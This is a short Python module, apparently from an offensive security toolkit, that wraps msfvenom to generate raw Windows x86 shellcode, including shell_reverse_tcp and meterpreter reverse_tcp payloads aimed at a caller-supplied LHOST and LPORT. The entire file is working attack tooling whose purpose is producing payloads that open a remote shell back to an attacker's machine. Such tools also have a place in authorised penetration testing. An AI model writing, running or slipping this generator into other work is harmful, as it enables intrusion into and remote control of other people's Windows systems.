#!/usr/bin/env python3
"""
Windows x86 Payload Generator
"""

import subprocess
from typing import Optional

class WindowsX86Payloads:
    """
    Générateur de payloads Windows x86
    """
    
    MSF_PAYLOADS = {
        'reverse_tcp': 'windows/shell_reverse_tcp',
        'meterpreter': 'windows/meterpreter/reverse_tcp',
        'exec': 'windows/exec',
    }
    
    def __init__(self, use_msf: bool = True):
        self.use_msf = use_msf
    
    def reverse_tcp(self, lhost: str, lport: int) -> bytes:
        """Reverse TCP shell"""
        if self.use_msf:
            return self._use_msfvenom('reverse_tcp', lhost, lport)
        return b""
    
    def _use_msfvenom(self, payload_key: str, lhost: str, lport: int) -> bytes:
        """Utilise msfvenom"""
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw']
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""